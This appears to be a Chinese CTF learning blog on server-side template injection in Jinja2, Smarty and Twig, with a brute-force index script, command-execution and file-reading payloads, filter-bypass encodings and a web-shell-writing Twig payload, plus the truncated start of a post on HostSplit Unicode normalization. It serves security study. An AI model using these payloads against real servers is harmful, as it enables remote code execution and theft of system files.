<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://node4.buuoj.cn:28424/?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>大佬提供了几个包含 eval 函数的类，以后用的时候可以直接搜索以下类</p>
<ul>
<li>warnings.catch_warnings</li>
<li>warnings.WarningMessage</li>
<li>codecs.IncrementalEncoder</li>
<li>codecs.IncrementalDecoder</li>
<li>codecs.StreamReaderWriter</li>
<li>reprlib.Repr</li>
<li>weakref.finalize</li>
</ul>
<p><strong>ps：执行 eval 函数时如果没有内置os模块，需要我们手动导入，如下就是一个例子</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="用-os-模块执行命令"><a href="#用-os-模块执行命令" class="headerlink" title="用 os 模块执行命令"></a>用 os 模块执行命令</h3><ul>
<li>os模块 中有 system 和 popen 两个函数可用来执行命令</li>
<li>其中 system函数 执行命令是没有回显的，但可以使用 system()函数 配合curl外带数据</li>
<li>popen()函数执行命令有回显，所以常用的函数为 popen()函数，当popen()函数被过滤掉时，可以用system()函数代替</li>
</ul>
<p>如下是包含 os模块 的类，想要执行命令时可直接搜索<del>（哎，只知道这两个）</del></p>
<ul>
<li>site._Printer</li>
<li>site.Quitter</li>
</ul>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>​	用 os模块 执行命令是调用的popen函数，那我们也可以直接调用popen函数，用上面的脚本遍历一下存在所需函数 的类即可</p>
<h3 id="其他函数执行命令"><a href="#其他函数执行命令" class="headerlink" title="其他函数执行命令"></a>其他函数执行命令</h3><ul>
<li><p>popen 函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>linecache 函数：可用于读取任意一个文件的某一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[168].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>​	<code>&#123;&#123;config&#125;&#125;</code>可以查询配置信息，如果题目有设置类似**app.config[‘FLAG’] &#x3D; os.environ.pop(‘FLAG’)**，就可以直接访问 <code>&#123;&#123;config['FLAG']&#125;&#125; </code>或者 <code>&#123;&#123;config.FLAG&#125;&#125;</code> 获得flag</p>
<p><code>	&#123;&#123;self.__dict__&#125;&#125; </code>：输出当前上下文中的所有变量和值，会将上下文中的变量和值转换为一个字典，其中键是变量名，值是变量值。这个字典包含了 flask 应用程序在运行时的所有上下文变量，包括配置、请求和会话等信息</p>
<h3 id="url-for"><a href="#url-for" class="headerlink" title="url_for"></a>url_for</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__&#125;&#125; 						<span class="comment"># 查询current_app(当前使用的app)</span></span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;	<span class="comment"># 查询配置信息</span></span><br></pre></td></tr></table></figure>

<p>构造的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls &#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>常规的 payload 一般很长，我们可以使用 flask内置的全局函数 来构造 payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>​	通过 <code>__globals__</code>  属性获取全局空间中的 os 模块，调用 popen() 函数来执行系统命令；因为 popen 函数返回的结果是个文件对象，因此需要调用 read() 函数来获取执行结果</p>
<h3 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages"></a>get_flashed_messages</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># paylaod:</span></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="名词概念"><a href="#名词概念" class="headerlink" title="名词概念"></a>名词概念</h2><p><strong>类</strong></p>
<p>​	面向对象语言的方法来自于类，python有很多函数库，我们在写 py 中会用到 import 来引入 类 和 方法，str(字符串)、dict(字典)、tuple(元组)、list(列表)等在 python类结构的基类都是object，它拥有很多的子类</p>
<p><strong>基类</strong></p>
<ul>
<li><p>指在面向对象编程中，被其他类继承的类，也可以称之为父类、超类</p>
</li>
<li><p>基类通常包含一些共同的属性和方法，被其他类继承后可以直接使用这些属性和方法，而不必重新定义</p>
</li>
<li><p>通过继承基类，可以让子类具有基类的特征，可以此基础上 添加 或 修改 自己的属性和方法</p>
</li>
<li><p>一个类可以从一个或多个类继承属性和方法，直接父类指的是直接位于该类下面的父类</p>
</li>
</ul>
<p><strong>内建函数</strong>：python内置的一些常用的函数，也叫内置函数，可以直接使用而无需预先导入模块，如：print() 、len()、range()、type()</p>
<h2 id="注入练习"><a href="#注入练习" class="headerlink" title="注入练习"></a>注入练习</h2><p>​	在Python的SSTI中，大部分是 找到父类<code>&lt;type &#39;object&#39;&gt;</code>—&gt;子类—&gt;找关于命令执行或者文件操作的模块 的方式来利用SSTI</p>
<p><strong>Web_python_template_injection</strong>：</p>
<ol>
<li><p>测试是否存在模板注入，<code>&#123;&#123;1+1&#125;&#125;</code> (构造简单的payload，看服务器是否有回显)</p>
</li>
<li><p>获取’’字符串的所属对象  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125;</span><br><span class="line">	&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取str类的父类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__&#125;&#125;</span><br><span class="line">	&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取object类的所有子类（&lt;type ‘file’&gt;类可以文件读写），python3移除了file，所以利用 file 子类文件读取只能在python2中用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()&#125;&#125;</span><br><span class="line">	<span class="comment"># 2代表str的父类中object出现的位置(当然从0开始)</span></span><br><span class="line">	</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">	<span class="comment"># 读取文件内容,若第40个类是file类(下标从0开始)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>找到所需的类在列表第几位（**&lt;class ‘site._Printer’&gt;** 、**&lt;class ‘site.Quitter’**&gt;类可以进行命令执行）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">	<span class="comment"># popen(&#x27;ls&#x27;).read():将 ls 的结果读取给变量，所以它会把当前目录所有文件都打印在我们的网页上</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>读取文件内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat fl4g&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="过滤bypass"><a href="#过滤bypass" class="headerlink" title="过滤bypass"></a>过滤bypass</h2><h3 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="[ ]过滤绕过"></a><code>[ ]</code>过滤绕过</h3><ul>
<li><p><code>__getitem__</code> 绕过：使用 <code>__getitem__()</code> 方法输出序列属性中的某个索引处的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().__getitem__(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">	<span class="comment"># 指定序列属性</span></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">	<span class="comment"># 指定字典属性</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>pop</code> 绕过：可以返回 指定序列属性中的某个索引处的元素 或 指定字典属性中某个键对应的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">	<span class="comment"># 指定序列属性</span></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>).pop(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">	<span class="comment"># 指定字典属性</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>利用字典读取绕过：访问字典里的值有两种方法，一种是把相应的键放入方括号 <code>[]</code> 里来访问，另一种是用点 <code>.</code> 来访问。所以，当方括号 <code>[]</code> 被过滤之后，我们还可以用点 <code>.</code> 的方式来访问</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">	<span class="comment">#等同于:</span></span><br><span class="line">[__builtins__][<span class="string">&#x27;eval&#x27;</span>]()&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><ul>
<li><p>字符串拼接绕过：以过滤class为例子，用中括号括起来然后里面用引号连接，可以用<code>+</code>号或者用 <code>&#39;&#39;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload:</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;fl&#x27;</span>+<span class="string">&#x27;4g&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>join拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><ul>
<li><p>base64编码绕过：可以将被过滤的关键字用base64加密来绕过（同理还可以进行 hex、unicode编码）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__[<span class="string">&#x27;X19nbG9iYWxzX18=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)].__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">	<span class="comment"># 过滤 __globals__</span></span><br><span class="line">&#123;&#123;().__getattribute__(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br><span class="line">	<span class="comment"># 过滤 __class__</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Unicode编码绕过（flask适用）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u0065\u0076\u0061\u006c&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">	<span class="comment"># 编码__builtins__和eval</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>十六进制编码绕过（过滤 u 时可用）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__[<span class="string">&#x27;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">	<span class="comment"># 过滤 __globals__</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x65\x76\x61\x6c&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">	<span class="comment"># 编码了__builtins__ 和 eval</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>参考：</p>
<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI（模板注入）漏洞（入门篇）</a></p>
<p><a href="https://xz.aliyun.com/t/12163">Flask基础及模板注入漏洞（SSTI）</a></p>
<p><a href="https://blog.csdn.net/heqiang525/article/details/89879056">Python中if <strong>name</strong> &#x3D;&#x3D; ‘__main__‘：的作用和原理</a></p>
<p><a href="https://xz.aliyun.com/t/9584#toc-3">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</a></p>
<h1 id="PHP中的SSTI"><a href="#PHP中的SSTI" class="headerlink" title="PHP中的SSTI"></a>PHP中的SSTI</h1><p>​	API：应用程序编程接口，是一些预先定义的函数。提供 应用程序 与 开发人员 基于某软件或硬件得以访问一组例程的能力，无需 访问源码 或 理解内部工作机制的细节</p>
<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p>​	为不受信任的模板执行提供了安全模式，这会强制执行在 PHP 安全函数白名单中的函数，因此我们在模板中无法直接调用 PHP 中直接执行命令的函数</p>
<p>​	但实际上对语言的限制并不能影响我们执行命令，因为可用 $smarty内置变量 访问各种环境变量</p>
<p><strong>[CISCN2019 华东南赛区]Web11</strong>：</p>
<p>​	一个获取IP的API(但API好像无法使用)，那么出现的IP可能是 <code>X-Forwarded-For </code>控制的，在最下方可看到是Smarty模板引擎</p>
<ul>
<li>测试是否存在模板注入，修改XFF的值，发现存在SSTI</li>
<li>先用 ls 命令查找 flag的位置，再构造 <code>&#123;&#123;system('cat /flag')&#125;&#125;</code> 得到flag</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/103/SSTI-02.jpg" alt="SSTI-02"></p>
<p><strong>常规利用方式</strong></p>
<ul>
<li>获得 smarty 的版本号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&#123;if&#125;</code> 标签</li>
</ul>
<p>​	每个 <code>&#123;if&#125;</code> 必须有一个 配对的 <code>&#123;/if&#125;</code> ，全部的 PHP条件 和 函数 都可以使用，如 || 、or、and、&amp;&amp;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><p>​	一个加载器 loader(Twig_Loader_Array) 来定位模板，一个环境变量 environment(Twig_Environment) 来存储配置信息，其中 render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板</p>
<p>​	Twig 渲染的页面，其中模版含有 <code>&#123;&#123;name&#125;&#125;</code> 变量，其模版变量值来自于GET请求参数 <code>$_GET[&quot;name&quot;] </code></p>
<p><strong>[BJDCTF2020]Cookie is so stable</strong>：</p>
<ul>
<li><p>用 <code>&#123;&#123;7*'7'&#125;&#125;</code> 判断出是Twig模板(直接在username框中输入)，hint中的源码有提示cookie</p>
</li>
<li><p>登陆后 F12 查看cookie值发现有个 user 变量记录着我们输入的 username</p>
</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/103/SSTI-03.jpg" alt="SSTI-03"></p>
<ul>
<li>抓包修改 user 的值，PHPSESSID 与 user之间用 <code>;</code> 隔开，Twig注入有固定的payload</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">	<span class="comment">//查看id值</span></span><br><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;ls /&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;	<span class="comment">//查看flag</span></span><br></pre></td></tr></table></figure>

<p>​	以上使用的Twig为2.x版本，现在官方已经更新到3.x版本，官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;/etc/passwd&#x27;</span>|<span class="title function_ invoke__">file_excerpt</span>(<span class="number">1</span>,<span class="number">30</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.<span class="title function_ invoke__">get</span>(<span class="number">1</span>).<span class="title function_ invoke__">__construct</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.<span class="title function_ invoke__">get</span>(<span class="number">1</span>).openFile.<span class="title function_ invoke__">fread</span>(<span class="number">99</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;whoami&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">enableDebug</span>()&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">isDebug</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|<span class="title function_ invoke__">map</span>(<span class="string">&quot;system&quot;</span>)|<span class="title function_ invoke__">join</span>(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|<span class="title function_ invoke__">map</span>(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>,<span class="number">0</span>]|<span class="title function_ invoke__">sort</span>(<span class="string">&quot;system&quot;</span>)|<span class="title function_ invoke__">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|<span class="title function_ invoke__">filter</span>(<span class="string">&quot;system&quot;</span>)|<span class="title function_ invoke__">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>,<span class="number">0</span>]|<span class="title function_ invoke__">reduce</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;id&quot;</span>)|<span class="title function_ invoke__">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat /etc/passwd&#x27;</span>]|<span class="title function_ invoke__">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>炼气</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>估计以后不会遇到的漏洞</title>
    <url>/2023/01/17/104%E2%80%94%E4%BC%B0%E8%AE%A1%E4%BB%A5%E5%90%8E%E4%B8%8D%E4%BC%9A%E9%81%87%E5%88%B0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>​	闲来无事，偶尔打打CTF，<del>每打一道题都是我的知识盲区，可恶</del>，姑且先都记下来留个记录（不知道以后还会不会碰到，就算碰到我能想起来吗）</p>
<h1 id="HostSplit-域名分割漏洞"><a href="#HostSplit-域名分割漏洞" class="headerlink" title="HostSplit(域名分割漏洞)"></a>HostSplit(域名分割漏洞)</h1><p>​	Black Hat USA 2019议题之一：HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization，PPT链接：<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">我是PPT链接哟</a>，<del>虽然都是英文的，但幸好有图帮助理解，哎,英语不太好</del>，这里说的大概就是：两个字符集之间由于适用情况的不同(毕竟语言不同嘛)而造成一些特殊的字符 转换错误 或者 转换后无法被识别（能看懂的部分）</p>
<p>​	应该是叫这个名字，勉强能看得懂PPT的内容(在一句一句有道翻译的情况下)</p>
<h2 id="Unicode、UTF-8"><a href="#Unicode、UTF-8" class="headerlink" title="Unicode、UTF-8"></a>Unicode、UTF-8</h2><ul>
<li><p>Unicode是为每一个 字符 分配唯一 代号(ID)的<strong>字符集</strong>（但却没有规定如何存储）</p>
<p>​	这时用什么规则存储 Unicode 字符就成了关键，我们规定，一个字符 使用四个字节存储，也就是 32位，这样就能涵盖现有 Unicode 包含的所有字符，这种编码方式叫做 UTF-32</p>
<p>​	但是其缺陷很明显，假设使用 UTF-32 和 ASCII 分别对一个只有西文字母的文档编码，前者需要花费的空间是后者的四倍（ASCII 每个字符只需要一个字节存储）</p>
</li>
<li><p>UTF-8是将 代号(ID) 转换为 字节序列 的<strong>编码规则</strong></p>
<p>UTF-8更为节省空间 ，UTF-8 代表 8 位一组表示 Unicode 字符的格式，使用 1-4 个字节来表示字符。</p>
</li>
</ul>
<h2 id="IDN"><a href="#IDN" class="headerlink" title="IDN"></a>IDN</h2><p>​	Internationalized Domain Names，国际化域名，指 全部 或 部分 使用特殊文字或字母组成的互联网域名，如使用汉语时，文字系统由万国码(Unicode)编译而成，国际化域名使用域名代码（Punycode）编写并以 ASCII码的形式 储存在域名系统中（DNS）</p>
<p><strong>Unicode转化为 ASCII码又分为两步</strong>：</p>
<ol>
<li><p>标准化，将字符转化为标准形式（Convert characters to a “standardized form”）</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/104/hostsplit-01.jpg" alt="hostsplit-01"></p>
</li>
<li><p>用 punycode编码 将Unicode编码成ASCII码</p>
</li>
</ol>
<p>   当遇到一些特殊字符时(比如中文域名)，域名会转化为如下的形式(复制粘贴的时候会这样)</p>
<p>   <img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/104/hostsplit-02.jpg" alt="hostsplit-02"></p>
<blockquote>
